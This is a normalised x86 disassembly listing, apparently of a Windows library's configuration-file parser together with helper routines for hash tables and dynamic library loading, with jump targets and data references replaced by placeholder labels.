inc eax
movsx edi dl
mov dl [ eax ]
mov ebx edx
and ebx 0xff
test [ ecx + ebx * 2 ] 0x8
jne r-xdata
test edx 0x307
je r-xdata
xor edx edx
mov dl [ ecx + 0x1 ]
test [ eax + edx * 2 ] 0x8
je r-xdata
mov esi edi
test cl 0x8
jne r-xdata
test bl 0x20
je r-xdata
inc eax
movsx edi dl
mov dl [ eax ]
mov ebx edx
and ebx 0xff
mov bx [ ecx + ebx * 2 ]
test bl 0x8
jne r-xdata
movsx edx [ eax ]
cmp edx edi
jne r-xdata
movsx edx dl
cmp edx edi
jne r-xdata
mov dl [ ecx ]
mov eax ecx
cmp dl 0x3a
jne r-xdata
inc ecx
jmp r-xdata
add ecx 0x2
jmp r-xdata
inc ecx
jmp r-xdata
test edx 0x307
je r-xdata
xor edx edx
mov dl [ ecx + 0x1 ]
test [ eax + edx * 2 ] 0x8
je r-xdata
inc edi
xor edx edx
mov dl [ edi ]
mov cx [ eax + edx * 2 ]
test cl 0x10
jne r-xdata
test bl 0x8
jne r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
test [ ecx + edx * 2 ] 0x8
jne r-xdata
movsx edx [ eax ]
cmp edx edi
jne r-xdata
movsx edx dl
cmp edx edi
je r-xdata
mov dl [ eax ]
mov edi edx
and edi 0xff
mov bx [ ecx + edi * 2 ]
test bl 0x80
mov [ esp + 0x14 ] ebx
je r-xdata
jmp r-xdata
mov dl [ eax + 0x1 ]
inc eax
mov ebx edx
and ebx 0xff
test [ ecx + ebx * 2 ] 0x8
je r-xdata
movsx edx [ eax + 0x1 ]
cmp edx edi
jne r-xdata
mov esi [ esp + 0x4c ]
cmp [ ecx + 0x1 ] 0x3a
jne r-xdata
xor edx edx
mov dl [ ecx ]
mov dx [ eax + edx * 2 ]
test dl 0x20
je r-xdata
xor edx edx
mov esi ecx
mov dl [ ecx ]
mov dx [ eax + edx * 2 ]
test dl 0x10
je r-xdata
inc ecx
jmp r-xdata
add ecx 0x2
jmp r-xdata
inc ecx
jmp r-xdata
mov eax [ esp + 0x4c ]
xor ecx ecx
mov cl [ esi ]
mov eax [ eax + 0x4 ]
mov cx [ eax + ecx * 2 ]
test cl 0x10
je r-xdata
inc eax
add eax 0x2
jmp r-xdata
jmp r-xdata
test bl 0x20
je r-xdata
inc eax
cmp [ ecx ] 0x3d
jne r-xdata
test dl 0x8
jne r-xdata
lea eax [ ecx + 0x2 ]
mov [ esp + 0x14 ] esi
mov esi [ esp + 0x4c ]
mov [ ecx ] 0x0
mov [ esp + 0x2c ] eax
mov dl [ esi ]
cmp dl 0x5d
je r-xdata
test dl 0x8
jne r-xdata
xor edx edx
mov dl [ ecx ]
mov dx [ eax + edx * 2 ]
test dl 0x20
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
mov ebx edx
and ebx 0xff
mov bx [ ecx + ebx * 2 ]
test bl 0x8
je r-xdata
inc eax
xor edx edx
mov dl [ eax ]
test [ ecx + edx * 2 ] 0x8
jne r-xdata
push 0x16e
push r--data
push 0x65
jmp r-xdata
mov [ eax ] 0x0
lea eax [ ecx + 0x1 ]
mov ecx [ esp + 0x4c ]
xor edx edx
mov dl [ eax ]
mov ebp eax
mov ecx [ ecx + 0x4 ]
mov bx [ ecx + edx * 2 ]
test bl 0x10
je r-xdata
inc ecx
xor edx edx
mov dl [ ecx ]
mov dx [ esi + edx * 2 ]
test dl 0x10
jne r-xdata
test edx 0x307
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
test [ ecx + edx * 2 ] 0x8
je r-xdata
lea eax [ esp + 0x10 ]
mov [ ecx ] 0x0
mov ecx [ esp + 0x4c ]
push edi
push eax
push 0x0
push ecx
call sub_10069b70
add esp 0x10
test eax eax
je r-xdata
test dl dl
je r-xdata
inc esi
xor edx edx
mov dl [ esi ]
mov dx [ eax + edx * 2 ]
test dl 0x10
jne r-xdata
test bl 0x8
jne r-xdata
mov edx ebx
mov esi [ esi + 0x4 ]
xor edx edx
mov dl [ eax ]
mov ecx eax
mov dx [ esi + edx * 2 ]
test dl 0x10
je r-xdata
inc eax
jmp r-xdata
add eax 0x2
jmp r-xdata
inc eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call sub_1001dca0
mov ebp [ esp + 0x2c ]
mov edi [ esp + 0x50 ]
mov esi [ esp + 0x1c ]
add esp 0x4
mov edx [ esp + 0x10 ]
mov esi [ esp + 0x4c ]
push edx
push esi
call sub_10069fc0
add esp 0x8
mov [ esp + 0x24 ] eax
test eax eax
jne r-xdata
push 0x14d
push r--data
push 0x64
jmp r-xdata
jmp r-xdata
dec eax
cmp eax ebp
je r-xdata
inc eax
xor edx edx
mov dl [ eax ]
test [ ecx + edx * 2 ] 0x8
je r-xdata
inc ebp
xor edx edx
mov dl [ ebp ]
mov dx [ ecx + edx * 2 ]
test dl 0x10
jne r-xdata
mov ecx [ esi + 0x4 ]
xor edx edx
mov dl [ eax ]
mov dx [ ecx + edx * 2 ]
test dl 0x20
je r-xdata
mov eax [ esp + 0x10 ]
push eax
push esi
call sub_1006a3b0
add esp 0x8
mov [ esp + 0x24 ] eax
test eax eax
je r-xdata
mov ecx esi
push 0x17c
push r--data
push 0xc
mov [ eax + 0x1 ] 0x0
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
mov [ esp + 0x18 ] esi
je r-xdata
xor edx edx
mov dl [ eax ]
test [ ecx + edx * 2 ] 0x10
je r-xdata
test dl 0x8
jne r-xdata
push 0x157
push r--data
push 0x67
jmp r-xdata
jmp r-xdata
push 0x17f
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
dec eax
cmp eax ebp
jne r-xdata
mov ebx [ esp + 0x2c ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
push 0x183
push r--data
not ecx
push ecx
call sub_1001d4c0
mov edx eax
add esp 0xc
mov [ esi + 0x4 ] edx
add esi 0x8
test edx edx
mov [ esi ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] eax
push 0x188
jmp r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push ebx
push edx
call sub_100267d0
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x58 ]
push ebp
push esi
push ecx
push edx
call sub_10069b70
add esp 0x1c
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esp + 0x24 ]
mov esi [ esp + 0x4c ]
mov esi [ esp + 0x4c ]
push edi
push esi
call sub_10069fc0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
push 0x1a4
mov ebp [ esp + 0x30 ]
mov [ esp + 0x18 ] 0x0
mov ecx [ esp + 0x18 ]
push ecx
push eax
push esi
call sub_1006a060
add esp 0xc
test eax eax
je r-xdata
push edi
push esi
call sub_1006a3b0
add esp 0x8
test eax eax
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x196
push r--data
push 0x67
jmp r-xdata
jmp r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10069b70
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov [ esp + 0x1c ] ebp
mov [ esp + 0x10 ] ebp
call sub_1001dc60
mov ebx eax
cmp ebx ebp
mov [ esp + 0x14 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov esi [ esp + 0x40 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
push ecx
push ebx
mov [ esp + 0x28 ] ecx
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
push ebx
call sub_1001dca0
add esp 0x4
mov al [ esi ]
mov edi [ esp + 0x34 ]
mov edx eax
mov ecx [ edi + 0x4 ]
and edx 0xff
mov dx [ ecx + edx * 2 ]
test dl 0x40
je r-xdata
test dh 0x4
je r-xdata
movsx eax al
inc esi
mov [ esp + 0x40 ] eax
mov al [ esi ]
mov edx eax
and edx 0xff
mov dx [ ecx + edx * 2 ]
test dl 0x8
jne r-xdata
test dl 0x20
je r-xdata
movsx edx al
mov al [ esi + 0x1 ]
inc esi
mov [ esp + 0x40 ] edx
mov edx eax
and edx 0xff
test [ ecx + edx * 2 ] 0x8
jne r-xdata
movsx eax [ esi ]
cmp eax [ esp + 0x40 ]
jne r-xdata
movsx ebx al
cmp ebx [ esp + 0x40 ]
je r-xdata
test dl 0x8
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
mov [ esp + 0x2c ] al
inc esi
mov edx [ esp + 0x2c ]
and edx 0xff
test [ ecx + edx * 2 ] 0x8
jne r-xdata
mov eax [ esp + 0x40 ]
jmp r-xdata
movsx ecx al
mov eax [ esp + 0x40 ]
cmp ecx eax
jne r-xdata
inc esi
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov [ esp + 0x10 ] ebp
jmp r-xdata
test dl 0x20
je r-xdata
mov eax [ ebx + 0x4 ]
mov esi [ esp + 0x3c ]
mov [ eax + ebp ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
cmp al 0x24
jne r-xdata
cmp al 0x72
jne r-xdata
movsx edx [ esi ]
cmp edx eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov cl [ esi ]
mov [ eax + ebp ] cl
mov al [ esi + 0x1 ]
inc ebp
mov ecx [ edi + 0x4 ]
inc esi
mov edx eax
and edx 0xff
test [ ecx + edx * 2 ] 0x8
je r-xdata
movsx edx [ esi + 0x1 ]
cmp edx eax
jne r-xdata
mov ebx [ esp + 0x14 ]
inc ebp
inc esi
mov ecx [ ebx + 0x4 ]
mov [ ecx + ebp - 0x1 ] al
mov al [ esi ]
mov ecx [ edi + 0x4 ]
mov edx eax
and edx 0xff
mov dx [ ecx + edx * 2 ]
test dl 0x8
je r-xdata
mov al [ esi + 0x1 ]
inc esi
mov edx eax
and edx 0xff
test [ ecx + edx * 2 ] 0x8
jne r-xdata
mov ecx [ ebx + 0x4 ]
push ebx
mov [ esi ] ecx
call sub_1001d740
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push eax
call sub_1001d740
add esp 0x4
mov edx [ ebx + 0x4 ]
inc ebp
mov [ esp + 0x10 ] ebp
inc esi
mov [ edx + ebp - 0x1 ] al
jmp r-xdata
mov dl [ esi + 0x1 ]
lea eax [ esi + 0x1 ]
xor edi edi
cmp dl 0x7b
mov [ esp + 0x18 ] edi
jne r-xdata
cmp al 0x6e
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov al 0xd
mov [ ecx + ebp ] al
inc ebp
mov [ esp + 0x10 ] ebp
jmp r-xdata
inc esi
jmp r-xdata
mov [ esp + 0x10 ] ebp
mov [ esp + 0x10 ] ebp
inc esi
mov [ esp + 0x10 ] ebp
cmp dl 0x28
jne r-xdata
mov [ esp + 0x40 ] 0x7d
cmp al 0x62
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov al 0xa
mov [ ecx + ebp ] al
inc ebp
mov [ esp + 0x10 ] ebp
jmp r-xdata
mov [ esp + 0x40 ] edi
jmp r-xdata
mov [ esp + 0x40 ] 0x29
jmp r-xdata
cmp [ ebp ] 0x3a
jne r-xdata
inc ebp
xor ebx ebx
mov bl [ ebp ]
test [ ecx + ebx * 2 ] 0x107
jne r-xdata
cmp al 0x74
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov al 0x8
mov [ ecx + ebp ] al
inc ebp
mov [ esp + 0x10 ] ebp
jmp r-xdata
mov edi [ esp + 0x38 ]
xor ebx ebx
mov bl [ eax ]
mov edx eax
mov ebp eax
test [ ecx + ebx * 2 ] 0x107
je r-xdata
inc eax
movsx eax [ ebp ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x24 ] eax
test ecx ecx
mov [ ebp ] 0x0
mov [ esp + 0x28 ] ebp
je r-xdata
cmp [ ebp + 0x1 ] 0x3a
jne r-xdata
mov ecx [ ebx + 0x4 ]
inc ebp
mov [ esp + 0x10 ] ebp
mov [ ecx + ebp - 0x1 ] al
jmp r-xdata
mov al 0x9
push edx
mov edx [ esp + 0x38 ]
push edi
push edx
call sub_1006a0d0
mov ebx eax
mov eax [ esp + 0x24 ]
add esp 0xc
test eax eax
je r-xdata
cmp eax ecx
jne r-xdata
mov edi eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x18 ] ebp
mov [ ebp ] 0x0
mov eax [ eax + 0x4 ]
add ebp 0x2
xor ecx ecx
mov [ esp + 0x1c ] 0x3a
mov cl [ ebp ]
mov edx ebp
test [ eax + ecx * 2 ] 0x107
je r-xdata
mov eax [ esp + 0x28 ]
mov dl [ esp + 0x24 ]
test ebx ebx
mov [ eax ] dl
je r-xdata
mov cl [ esp + 0x1c ]
mov [ eax ] cl
push 0x262
push r--data
push 0x66
jmp r-xdata
inc ebp
inc ebp
xor ecx ecx
mov cl [ ebp ]
test [ eax + ecx * 2 ] 0x107
jne r-xdata
push 0x275
push r--data
push 0x68
mov edi ebx
or ecx 0xffffffff
xor eax eax
mov edx esi
[ edi ]
mov edi [ esp + 0x14 ]
sub edx ebp
not ecx
mov eax [ edi ]
dec ecx
add ecx edx
add ecx eax
push ecx
push edi
call sub_1001dd90
mov al [ ebx ]
add esp 0x8
test al al
je r-xdata
push 0x65
push 0xe
call sub_1001de60
mov ebx [ esp + 0x28 ]
add esp 0x14
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov ebx [ esp + 0x14 ]
sub esi ebp
add eax esi
mov esi ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov al [ esp + 0x24 ]
mov [ ecx ] al
jmp r-xdata
mov edx [ edi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ edx + ecx ] al
mov al [ ebx + 0x1 ]
inc ecx
inc ebx
test al al
mov [ esp + 0x10 ] ecx
jne r-xdata
sub_10069f50
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax ]
mov eax [ esp + 0x8 ]
push edx
push r--data
push eax
call sub_10026b40
add esp 0xc
retn
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push edx
push ecx
mov ecx [ esp + 0x10 ]
push eax
push r--data
push ecx
call sub_10026b40
add esp 0x14
retn
sub_10069fc0
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
xor eax eax
add esp 0xc
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov [ esp ] eax
lea eax [ esp ]
mov [ esp + 0x4 ] 0x0
push eax
push ecx
call sub_1001ff80
add esp 0x8
add esp 0xc
retn
sub_1006a010
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
xor eax eax
add esp 0xc
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov [ esp ] eax
lea eax [ esp ]
mov [ esp + 0x4 ] 0x0
push eax
push ecx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
add esp 0xc
retn
sub_1006a060
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ eax + 0x8 ]
mov eax [ eax ]
push esi
push edi
mov [ esi ] eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
push esi
mov edx [ ecx + 0x8 ]
push edx
call sub_1001fcf0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
retn
pop edi
mov eax 0x1
pop esi
retn
push esi
push edi
call sub_1001e570
mov eax [ esi + 0x4 ]
push eax
call sub_1001d740
mov ecx [ esi + 0x8 ]
push ecx
call sub_1001d740
push esi
call sub_1001d740
add esp 0x14
sub_1006a0d0
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push edi
test ebp ebp
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
push ebp
call getenv
add esp 0x4
mov edi [ esp + 0x20 ]
test edi edi
je r-xdata
mov ecx [ ebx + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] ebp
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] edi
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
pop edi
pop ebp
pop ebx
add esp 0xc
retn
push esi
mov esi r--data
mov eax edi
mov eax [ eax + 0x8 ]
pop edi
pop ebp
pop ebx
add esp 0xc
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push ebp
call getenv
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
pop edi
pop ebp
pop ebx
add esp 0xc
retn
test eax eax
pop esi
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_1006a1b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
push sub_1006a300
push sub_1006a2d0
call sub_1001fbd0
add esp 0x8
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
pop esi
retn
sub_1006a1f0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov [ eax + 0x20 ] 0x0
mov eax [ esi + 0x8 ]
push eax
push sub_1006a240
push eax
call sub_10020000
mov eax [ esi + 0x8 ]
push eax
push sub_1006a260
push eax
call sub_10020000
mov eax [ esi + 0x8 ]
push eax
call sub_1001fca0
add esp 0x1c
sub_1006a260
push ebp
mov ebp [ esp + 0x8 ]
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push edi
push ebx
call sub_1001e7b0
mov edi eax
add esp 0x4
dec edi
js r-xdata
test ebx ebx
je r-xdata
push esi
mov edx [ ebp ]
push edx
call sub_1001d740
push ebp
call sub_1001d740
add esp 0x8
pop edi
pop ebx
push ebx
call sub_1001e780
add esp 0x4
push edi
push ebx
call sub_1001e7c0
mov esi eax
mov eax [ esi + 0x8 ]
push eax
call sub_1001d740
mov ecx [ esi + 0x4 ]
push ecx
call sub_1001d740
push esi
call sub_1001d740
add esp 0x14
dec edi
jns r-xdata
pop esi
sub_1006a2d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
push eax
call sub_100200c0
mov ecx [ esi ]
mov edi eax
push ecx
call sub_100200c0
add esp 0x8
shl eax 0x2
xor eax edi
pop edi
pop esi
retn
sub_1006a300
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x18 ]
mov eax [ ebp ]
mov esi [ edi ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
cmp eax [ edi + 0x4 ]
jne r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
neg eax
sbb eax eax
and eax 0x2
dec eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
sbb eax 0xffffffff
pop ebx
retn
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
sub_1006a3b0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
mov esi eax
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x11d
push r--data
push 0xc
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
push esi
call sub_1001e780
add esp 0x4
test ebx ebx
je r-xdata
mov ebp [ esp + 0x1c ]
or ecx 0xffffffff
mov edi ebp
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x120
mov esi ecx
push r--data
inc esi
push esi
call sub_1001d4c0
add esp 0xc
mov [ ebx ] eax
test eax eax
je r-xdata
push ebx
call sub_1001d740
add esp 0x4
mov esi [ esp + 0x10 ]
mov ecx esi
mov edi eax
mov eax ecx
mov esi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov edx [ esp + 0x18 ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] ecx
mov eax [ edx + 0x8 ]
push eax
call sub_1001fcf0
add esp 0x8
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_1006a480
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
xor esi esi
push edi
push esi
push ebp
call sub_10068080
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0xa6
push r--data
push 0x6f
push 0x78
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0xb0
push r--data
push 0x4
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push 0xac
push r--data
push 0x67
push 0x78
push 0x25
call sub_1001de60
push r--data
push edi
push r--data
push 0x3
call sub_1001e1a0
add esp 0x24
jmp r-xdata
mov [ esi ] ebx
mov eax [ ebp + 0x4 ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
push 0xb3
push r--data
push 0x41
jmp r-xdata
push edi
call sub_1001d740
add esp 0x4
test esi esi
je r-xdata
mov [ ebp + 0x24 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0xb9
push r--data
push 0x69
push 0x78
push 0x25
call sub_1001de60
add esp 0x14
test ebx ebx
je r-xdata
push esi
call sub_1001d740
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push ebx
call [ FreeLibrary@IAT ]
sub_1006a580
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax 0x1
jl r-xdata
push 0xcf
push r--data
push 0x43
push 0x79
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ edi + 0x4 ]
push ecx
call sub_1001e6e0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov edx [ esi ]
push edx
call [ FreeLibrary@IAT ]
test eax eax
jne r-xdata
push 0xd7
push r--data
push 0x68
push 0x79
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
push 0xdc
push r--data
push 0x6b
push 0x79
push 0x25
call sub_1001de60
mov eax [ edi + 0x4 ]
push esi
push eax
call sub_1001e6c0
add esp 0x1c
xor eax eax
pop edi
pop esi
retn
sub_1006a630
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
push 0xf0
push r--data
push 0x43
push 0x77
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax 0x1
jge r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_1001e7b0
mov edx [ esi + 0x4 ]
dec eax
push eax
push edx
call sub_1001e7c0
add esp 0xc
test eax eax
jne r-xdata
push 0xf5
push r--data
push 0x69
push 0x77
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ eax ]
push edi
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push 0xfb
push r--data
push 0x68
push 0x77
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
pop edi
pop esi
retn
push 0x101
push r--data
push 0x6a
push 0x77
push 0x25
call sub_1001de60
push r--data
push edi
push r--data
push 0x3
call sub_1001e1a0
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_1006a710
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
push 0x10f
push r--data
push 0x43
push 0x76
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax 0x1
jge r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_1001e7b0
mov edx [ esi + 0x4 ]
dec eax
push eax
push edx
call sub_1001e7c0
add esp 0xc
test eax eax
jne r-xdata
push 0x114
push r--data
push 0x69
push 0x76
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ eax ]
push edi
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push 0x11a
push r--data
push 0x68
push 0x76
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
pop edi
pop esi
retn
push 0x120
push r--data
push 0x6a
push 0x76
push 0x25
call sub_1001de60
push r--data
push edi
push r--data
push 0x3
call sub_1001e1a0
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_1006a7f0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
test esi esi
push edi
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
jne r-xdata
mov esi [ esp + 0x1c ]
test esi esi
jne r-xdata
mov edi [ esp + 0x14 ]
push 0x0
push esi
push edi
call sub_1006abe0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
push 0x227
[ edi ]
not ecx
push r--data
push ecx
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
push 0x232
[ edi ]
not ecx
push r--data
push ecx
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
push 0x222
push r--data
push 0x43
jmp r-xdata
push 0x1
push ebx
push edi
call sub_1006abe0
add esp 0xc
test eax eax
jne r-xdata
push 0x241
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x22b
jmp r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ebp
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x236
jmp r-xdata
push 0x86
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ esi ] 0x0
jne r-xdata
push 0x248
push r--data
push 0x41
push 0x86
push 0x25
call sub_1001de60
push esi
call sub_1001d740
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push r--data
push 0x41
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
jne r-xdata
mov cl [ ecx ]
cmp cl 0x5c
je r-xdata
mov ecx [ eax + 0x18 ]
mov [ esi + 0x18 ] ecx
mov edx [ eax + 0x1c ]
mov [ esi + 0x1c ] edx
jmp r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov ecx [ esi + 0x20 ]
test ecx ecx
jne r-xdata
cmp cl 0x2f
je r-xdata
mov ecx [ esi ]
xor eax eax
xor edi edi
test ecx ecx
je r-xdata
mov ecx [ eax + 0x20 ]
mov [ esi + 0x20 ] ecx
mov edx [ eax + 0x24 ]
mov [ esi + 0x24 ] edx
